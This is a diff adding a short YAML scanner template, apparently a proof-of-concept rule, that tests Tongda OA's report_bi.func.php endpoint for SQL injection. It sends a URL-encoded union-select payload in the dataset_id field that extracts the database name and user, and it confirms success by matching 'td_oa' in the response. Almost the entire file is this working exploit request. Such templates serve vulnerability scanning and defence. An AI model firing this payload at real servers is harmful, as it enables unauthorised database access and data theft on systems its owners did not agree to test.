@@ -1,0 +1,10 @@
+name: tongda-report-bi-func-sql-inject
+rules:
+  - method: POST
+    path: "/general/bi_design/appcenter/report_bi.func.php"
+    body: |
+      _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&
+    expression: |
+      response.status == 200  && response.body.bcontains(b'"col":') && response.body.bcontains(b'"td_oa"') && response.body.bcontains(b'"target":') && response.body.bcontains(b'"para":')
+detail:
+  author: 666
